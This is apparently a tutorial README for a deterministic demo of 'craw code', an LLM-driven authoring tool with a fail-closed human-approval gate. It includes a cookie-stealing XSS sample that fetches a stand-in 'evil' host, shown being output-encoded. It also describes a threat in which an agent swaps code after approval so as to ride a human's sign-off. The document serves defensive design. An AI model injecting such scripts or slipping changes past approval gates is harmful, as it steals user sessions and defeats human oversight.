# The `craw code` tour — the whole loop, end to end

This is the demo that proves the entire `craw code` loop works for real: an LLM scaffolds a
Crawfish project, reflects it, prices it, validates its own authoring, optimizes it, and
operates it — and every consequential change passes through a **human-approval gate that fails
closed**. The tour runs the *real* verbs through the one execution path (`craw code …`), captures
each step's versioned `--json` envelope, and walks the approval gate through its full
`propose → reject → approve → apply` lifecycle, including the two rejections that are the
load-bearing security contract.

It is **deterministic and offline**: no live model call, no network. The two steps where a model
*would* run are stood in for honestly — `optimize` runs in its `$0` `refine` mode (a pure replay
over the recorded baseline), and a "failed run" is written straight into the `.crawfish/` ledger
through the same [`ObserverSurface`](../../packages/crawfish/src/crawfish/observe.py) a real
engine run writes through, so `dashboard` / `review` / `diagnose` read a genuine ledger, not a
mock. (There is no `craw code run` verb; the engine is exercised by writing the ledger the engine
would write.)

!!! note "You will learn:"
    - The full author → operate loop as a sequence of `craw code` verbs, each emitting a typed `--json` envelope you can branch on
    - How the **human-approval gate** stages a typed diff + honest cost band, and **fails closed** on `apply` until a human approves the exact `(component, sha)`
    - The two fail-closed contracts: **no-approval** and **on-disk sha-drift** — both refuse to promote, non-retryably
    - How a tainted ledger field is **output-encoded** before it reaches HTML (UNFILED-XSS), with a strict CSP as defense-in-depth
    - Where each verb is documented in the [`craw code` guide](../../docs/guide/craw-code/index.md)

## Run it

```bash
# Watch every step print its argv, exit code, and --json envelope:
uv run python demo/craw-code-tour/tour.py

# Or run the pinned, deterministic pytest (mock-only, fast):
uv run pytest packages/crawfish/tests/test_craw_code_tour.py -q
```

The script runs the tour in a throwaway temp project; the pytest runs the same
[`run_tour`](tour.py) walkthrough against a `tmp_path` and asserts every exit code + the
load-bearing envelope fields, so the demo and the test can never drift apart.

## The walkthrough

Each step below is a real `craw code` verb. The tour drives them through
[`crawfish.code.cli.run_code`](../../packages/crawfish/src/crawfish/code/cli.py) — the same
surface the Claude Code plugin drives over Bash.

### Author

| # | Command | What it does | Guide |
| --- | --- | --- | --- |
| 1 | `craw code init --json <dir> --no-plugin` | Scaffold a fresh project (a `definitions/triage-bot` component, `.gitignore`, `crawfish.toml`) | [authoring](../../docs/guide/craw-code/authoring.md) |
| 2 | `craw code new --json definition summary-bot` | Author a second component from the scaffolder | [authoring](../../docs/guide/craw-code/authoring.md) |
| 3 | `craw code describe --json definitions/triage-bot` | Reflect the typed IO boundary (STATIC `project`, FLUID `ticket_body`, STATIC consequential `triage`) | [cli](../../docs/guide/craw-code/cli.md) |
| 4 | `craw code estimate --json definitions/triage-bot --items 5` | Price a run — the honest cost band `total ≤ expected ≤ worst_case`, no model call | [cli](../../docs/guide/craw-code/cli.md) |
| 5 | `craw code sync --json --dir .` | Reconcile the project against its ledger; a fresh scaffold is clean (exit 0, no drift) | [cli](../../docs/guide/craw-code/cli.md) |
| 6 | `craw code validate-authoring --json` | The authoring eval: the positive fixture is gate-clean, the negative corpus is rejected by the right gate | [security](../../docs/guide/craw-code/security.md) |
| 7 | `craw code optimize --json definitions/triage-bot --mode refine --seed 0` | `$0` refine — a pure replay over the recorded baseline (no live trial) | [operate](../../docs/guide/craw-code/operate.md) |

`estimate` is the honesty surface — the band never collapses to a single optimistic number:

```json
{"schema": "craw.code.estimate.v1", "component": "definitions/triage-bot", "items": 5,
 "total_usd": 4.5, "expected_usd": 4.5, "worst_case_usd": 4.5, "within_budget": true}
```

### Approve — the gate, fail-closed

This is the heart of the tour. An LLM author **cannot promote its own change**; a human must
approve the exact `(component, sha)`, and the gate refuses everything else. See
[review-and-approve](../../docs/guide/craw-code/review-and-approve.md).

**8. `craw code propose definitions/triage-bot`** stages a typed diff + an honest cost band,
keyed on `(component, candidate_sha)`. The decision is `pending` — no human has approved yet:

```json
{"schema": "craw.code.propose.v1", "component": "definitions/triage-bot",
 "candidate_sha": "731f083f8a9e", "approval": "pending",
 "cost_estimate": {"total_usd": 0.9, "expected_usd": 0.9, "worst_case_usd": 0.9}, "diff": []}
```

**9. `craw code apply definitions/triage-bot 731f083f8a9e`** — with **no** recorded approval —
**fails closed**. Exit `4` (security, non-retryable), `code: "no_approval"`, with the spec's
granular `detail.exit = 7`. An injected agent cannot retry past it:

```json
{"schema": "craw.error.v1", "code": "no_approval", "retryable": false,
 "detail": {"component": "definitions/triage-bot", "sha": "731f083f8a9e", "exit": 7},
 "remediation": "This change is not approved. A human must approve the staged (component, sha) before `craw code apply`."}
```

**10. `craw code reject definitions/triage-bot 731f083f8a9e`** records a human *reject* decision
and rolls the lineage back with a pure `$0` pointer move — no model call.

**11–13. propose again → a human approves → `apply` promotes.** The human approval is recorded
*out of band* (the operator/console action — never a fluid-reachable verb, so session data can
never auto-approve it). Now `apply` succeeds:

```json
{"schema": "craw.code.apply.v1", "component": "definitions/triage-bot",
 "sha": "731f083f8a9e", "result": "applied"}
```

**14. On-disk sha drift — the second fail-closed contract.** Approve a sha, then change the
component on disk, then `apply` the approved sha: **refused**, even though a valid approval row
still exists — because the on-disk content drifted to a different sha. The approval is bound to
the *artifact*, not to a sha string. The fix is to re-propose and re-approve, never to retry the
stale approval:

```json
{"schema": "craw.error.v1", "code": "no_approval", "retryable": false,
 "detail": {"component": "definitions/triage-bot",
            "approved_sha": "731f083f8a9e", "current_sha": "a99d2d899d22"},
 "remediation": "The component changed since approval; re-propose and re-approve the new sha."}
```

This is the guard pinned by `test_apply_after_on_disk_sha_drift_fails_closed` in
[`test_code_gate.py`](../../packages/crawfish/tests/test_code_gate.py): without it, an agent could
get sha A approved, swap in a malicious sha B before `apply`, and ride the human's approval.

### Operate & observe

| # | Command | What it does | Guide |
| --- | --- | --- | --- |
| 15 | `craw code deploy --json triage-bot --dir definitions/triage-bot` | Register the pipeline + scaffold its default observers (`cost_spike`, `failure_rate`, `stuck`) | [operate](../../docs/guide/craw-code/operate.md) |
| 16 | `craw code dashboard --json --project definitions/triage-bot` | The scrubbed, org-scoped read-model snapshot (`craw.code.dashboard.v1`) | [dashboard](../../docs/guide/craw-code/dashboard.md) |
| 17 | `craw code review --json --project definitions/triage-bot` | The authoring digest over the recent ledger window | [operate](../../docs/guide/craw-code/operate.md) |
| 18 | `craw code diagnose --json run-tour-1 --project definitions/triage-bot` | Correlate a failed run → first failing node + a `$0` replay remediation | [operate](../../docs/guide/craw-code/operate.md) |

`diagnose` reads the seeded failed run and points at the first failing node with a `$0` fix:

```json
{"schema": "craw.code.diagnose.v1", "run_id": "run-tour-1", "status": "failed",
 "first_failure": {"node": "summarize", "error_class": "validation",
                   "item_id": "ticket-42", "detail": "schema mismatch: invalid label"},
 "dlq": [{"item_id": "ticket-42", "reason": "schema mismatch: invalid label"}],
 "remediation": {"action": "replay_swap",
                 "command": "craw replay --swap model=<candidate-model> run-tour-1",
                 "estimated_usd": 0.0}}
```

### Output-encoding — XSS rendered inert (UNFILED-XSS)

The tour seeds a deliberately injection-shaped event detail —
`3 of 5 failed: <script>alert('xss')</script>` — into the ledger. The `--json` snapshot carries
it **verbatim** (a parser consumes it as a string, never executes it); the HTML renderer is the
layer that neutralizes it. Through the dashboard's
[output-encoding chokepoint](../../packages/crawfish/src/crawfish/code/dashboard/encoding.py):

```
raw     : <script>fetch('http://evil/'+document.cookie)</script>
encoded : &lt;script&gt;fetch(&#x27;http://evil/&#x27;+document.cookie)&lt;/script&gt;
```

…and every HTML response carries a strict CSP (`default-src 'none'; script-src 'self'; …`) as
defense-in-depth — so even if encoding were bypassed, an injected `<script>` has no source and an
off-host `<img>`/`fetch` beacon is blocked. The `review` digest output-encodes the same detail in
its body. See [security](../../docs/guide/craw-code/security.md).

## What the tour proves

- The whole loop runs through **one execution path** — `craw code <verb>` — with a typed,
  versioned `--json` envelope at every step.
- Consequential promotion is **gated and fails closed**: no-approval and sha-drift both refuse,
  exit `4`, non-retryable. A human approving the exact `(component, sha)` is the only way through.
- The read surfaces (`dashboard`, `review`, `diagnose`) operate on a real ledger and
  **output-encode** tainted text before HTML.

All of it is pinned, deterministic, and offline in
[`test_craw_code_tour.py`](../../packages/crawfish/tests/test_craw_code_tour.py).
